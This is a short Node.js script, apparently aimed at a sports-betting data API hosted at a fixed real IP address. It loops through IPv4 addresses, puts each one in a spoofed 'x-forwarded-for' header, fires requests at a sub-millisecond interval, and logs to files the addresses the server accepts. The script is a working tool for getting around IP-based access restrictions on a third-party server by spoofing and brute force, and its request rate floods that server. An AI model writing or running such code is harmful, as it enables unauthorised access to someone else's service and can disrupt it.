const { default: axios } = require("axios");
const fs = require("fs");

function* getIP() {
  for (let i = 111; i <= 255; i++) {
    for (let j = 1; j <= 255; j++) {
      for (let k = 1; k <= 255; k++) {
        for (let l = 1; l <= 255; l++) {
          yield `${i}.${j}.${k}.${l}`;
        }
      }
    }
  }
}

let ipGenerator = getIP();

const callAPI = async () => {
  try {
    let ip = ipGenerator.next().value;
    console.log("🚀 ~ file: index.js:20 ~ callAPI ~ ip:", ip);

    axios
      .get(
        "http://84.8.153.51/api/v2/fetch_data?Action=listCompetitions&EventTypeID=4",
        {
          headers: {
            "x-forwarded-for": ip,
          },
        }
      )
      .then((resp) => {
        console.log("Success IP is", ip);
        fs.writeFile(ip + ".txt", ip, (err) => {
          if (err) {
            console.error("Error writing to file", err);
          } else {
            console.log("File created successfully and content written!");
          }
        });
      })
      .catch((err) => {
        // console.log(err.response);
      });
  } catch (err) {
    console.log("🚀 ~ file: index.js:17 ~ callAPI ~ err:", err);
  }
};

setInterval(callAPI, 0.1);
